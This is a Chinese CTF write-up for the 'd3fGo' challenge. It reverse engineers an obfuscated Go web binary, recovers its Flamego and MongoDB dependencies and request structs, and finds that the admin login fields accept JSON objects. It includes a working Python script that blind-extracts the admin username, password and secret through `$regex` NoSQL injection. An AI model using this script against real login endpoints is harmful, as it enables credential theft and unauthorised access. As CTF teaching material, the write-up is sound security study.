# d3fGo

## 题目简述

题目是 Web + Go 二进制逆向。前端 JS 暴露 `/login` 和 `/admini/login` 路由，后端 Go 程序虽然做了混淆，但 `go version -m` 仍能看到模块依赖：`flamego` 表明是 Go Web 框架，`go.mongodb.org/mongo-driver` 表明使用 MongoDB。继续通过字符串、Bindiff 和参数结构体恢复 API 行为后，可以确认普通登录字段是 `string`，而管理员登录字段是 `interface{}`，因此 JSON 可以传入 MongoDB 操作符触发 NoSQL 注入。

## 解题过程

先看网站的 JS 文件，可以看到前端路由：

```
routes: [{
                path: "/",
                redirect: "Login"
            }, {
                path: "/login",
                name: "Login",
                component: function() {
                    return n.e("chunk-1b59b85f").then(n.bind(null, "a55b"))
                }
            }, {
                path: "/admini/login",
                name: "AdminLogin",
                component: function() {
                    return n.e("chunk-4cd60f38").then(n.bind(null, "23b1"))
                }
            }]
```

查看 Golang 依赖，混淆并没有处理 Go build info。这里的关键信息是 `github.com/flamego/flamego`、`go.mongodb.org/mongo-driver` 和若干认证/编码库，说明后端大概率是 Flamego + MongoDB 的 API 服务，而不是传统 SQL 后端。

可以写个 demo 自己编译一份然后 bindiff 一下恢复符号表

```
 ○ go version -m ./fgo
./fgo: zjesZGZS
        path    github.com/fgo
        mod     github.com/fgo  (devel)
        dep     github.com/alecthomas/participle/v2     v2.0.0-alpha7
h1:cK4vjj0VSgb3lN1nuKA5F7dw+1s1pWBe5bx7nNCnN+c=
        dep     github.com/fatih/color  v1.13.0
h1:8LOYc1KYPPmyKMuN8QV2DNRWNbLo6LZ0iLs8+mlH53w=
        dep     github.com/flamego/flamego      v1.0.1
h1:rHcvSFcFHfoAEZUQoqXVyVig/xbsjF0/hm7Fo4oZCBo=
        dep     github.com/go-stack/stack       v1.8.0
h1:5SgMzNM5HxrEjV0ww2lTmX6E2Izsfxas4+YHWRs3Lsk=
        dep     github.com/golang/snappy        v0.0.1
h1:Qgr9rKW7uDUkrbSmQeiDsGa8SjGyCOGtuasMWwvp2P4=
        dep     github.com/json-iterator/go     v1.1.12
h1:PV8peI4a0ysnczrg+LtxykD8LfKY9ML6u2jnxaEnrnM=
        dep     github.com/klauspost/compress   v1.13.6
h1:P76CopJELS0TiO2mebmnzgWaajssP/EszplttgQxcgc=
        dep     github.com/mattn/go-colorable   v0.1.9
h1:sqDoxXbdeALODt0DAeJCVp38ps9ZogZEAXjus69YV3U=
        dep     github.com/mattn/go-isatty      v0.0.14
h1:yVuAays6BHfxijgZPzw+3Zlu5yQgKGP2/hcQbHb7S9Y=
        dep     github.com/modern-go/concurrent v0.0.0-20180228061459-
e0a39a4cb421      h1:ZqeYNhU3OHLH3mGKHDcjJRFFRrJa6eAM5H+CtDdOsPc=
        dep     github.com/modern-go/reflect2   v1.0.2
h1:xBagoLtFs94CBntxluKeaWgTMpvLxC4ur3nMaC9Gz0M=
        dep     github.com/pkg/errors   v0.9.1
h1:FEBLx1zS214owpjy7qsBeixbURkuhQAwrK5UwLGTwt4=
        dep     github.com/xdg-go/pbkdf2        v1.0.0
h1:Su7DPu48wXMwC3bs7MCNG+z4FhcyEuz5dlvchbq0B0c=
        dep     github.com/xdg-go/scram v1.0.2
h1:akYIkZ28e6A96dkWNJQu3nmCzH3YfwMPQExUYDaRv7w=
        dep     github.com/xdg-go/stringprep    v1.0.2
h1:6iq84/ryjjeRmMJwxutI51F2GIPlP5BfTvXHeYjyhBc=
        dep     github.com/youmark/pkcs8        v0.0.0-20181117223130-
1be2e3e5546d      h1:splanxYIlg+5LfHAM6xpdFEAYOk8iySO56hMFq6uLyA=
        dep     go.mongodb.org/mongo-driver     v1.8.2
h1:8ssUXufb90ujcIvR6MyE1SchaNj0SFxsakiZgxIyrMk=
        dep     golang.org/x/crypto     v0.0.0-20201216223049-8b5274cf687f
h1:aZp0e2vLN4MToVqnjNEYEtrEA8RH8U8FN1CU7JgqsPU=
        dep     golang.org/x/sync       v0.0.0-20190911185100-cd5d95a43a6e
h1:vcxGaoTs7kV8m5Np9uUNQin4BrLOthgV7252N8V+FwY=
        dep     golang.org/x/sys        v0.0.0-20210630005230-0f9fa26af87c
h1:F1jZWGFhYfh0Ci55sIpILtKKK8p3i2/krTr0H1rg74I=
        dep     golang.org/x/text       v0.3.5
h1:i6eZZ+zk0SOf0xgBpEpPD18qWcJda6q1sxt3S0kzyUQ=
        dep     gopkg.in/ini.v1 v1.66.3
h1:jRskFVxYaMGAMUbN0UZ7niA9gzL9B49DOqE78vg0k3w=
```

运行一下可以发现报错（题目读取配置文件直接沿用了以前项目，`bot.ini` 忘记改）：

```
[config] load 'config/bot.ini': open config/web.ini: no such file or directory
```

搜索一下 config/bot.ini  即可找到调用的函数

这里可以看出加载的是 MongoDB 配置，因此后续重点检查 JSON 到 Mongo 查询的绑定方式，优先考虑 NoSQL 注入。

继续找下一个字符串，比如说 Find the Secret ，在这个函数内可以看到参数绑定的 struct

`Find the Secret` 对应的处理函数会读取 `username`、`password`、`secret` 等字段，并把它们绑定进查询结构体。

又比如说 Invalid username or password ，在这个函数内也可以找到参数绑定的 struct，而且是interface 类型

`Invalid username or password` 路径对应的登录逻辑中，部分字段类型是 `interface{}`，这意味着 JSON 对象可以直接进入 Mongo 查询条件，形成 NoSQL 注入面。

因此可以推断出这两个 API 中的结构体：

```
// /api/Logintype LoginForm struct {Username string `json:"username"`Password string `json:"password"`}


// /api/Admini/Logintype AdminiLoginForm struct {Username interface{} `json:"username"`Password interface{} `json:"password"`Seeecret interface{} `json:"seeecret"`}
```

`/api/Login` 的字段是 `string`，JSON 操作符不会进入查询；`/api/Admini/Login` 的 `username`、`password`、`seeecret` 都是 `interface{}`，请求体中可以传对象，例如 `{"$regex":"^"}`，从而把字段值变成 MongoDB 查询条件。

exp 如下，通过逐字符扩展 `$regex`，根据返回状态判断当前前缀是否匹配：

```
import requests
import string
# base_url = 'http://127.0.0.1:22830'
base_url = 'http://8a4f0fe099.fgo-d3ctf-challenge.n3ko.co'
target_url = '/api/Admini/Login'
payload = {
    "username": {
        "$regex": "^"
    },
    "password": {
        "$regex": "^"
    },
    "seeecret": {
        "$regex": "^"
    }
}
table = string.printable
reg_l = '.+*?|'


def blind(ind):
    target = '^'
    s = requests.session()
    url = base_url + target_url
    while True:
        for c in table:
            temp = (c if c not in reg_l else '\\' + c)
            payload[ind]['$regex'] = target + temp
            r = s.post(url, json=payload)
            if r.status_code == 200:
                print(payload[ind]['$regex'])
                target += temp
                break
        if payload[ind]['$regex'][-1] == '$':
            break


def main():
    # blind('username')
    # blind('password')
    blind('seeecret')

    print(payload)


if __name__ == '__main__':
    main()
```

## 方法总结

- 核心技巧：利用 Go build info 和字符串定位框架/数据库依赖，再从结构体字段类型判断 JSON 是否能注入 MongoDB 操作符。
- 识别信号：Go Web 题中即使符号混淆，`go version -m` 仍可能泄露模块依赖；如果看到 MongoDB 驱动且请求字段绑定到 `interface{}`，应检查 `$regex`、`$ne` 等 NoSQL 注入。
- 复用要点：普通 `string` 字段通常会把 JSON 操作符当字符串处理；`interface{}` / `map` / `bson.M` 一类弱类型绑定更容易让用户输入直接进入查询表达式。
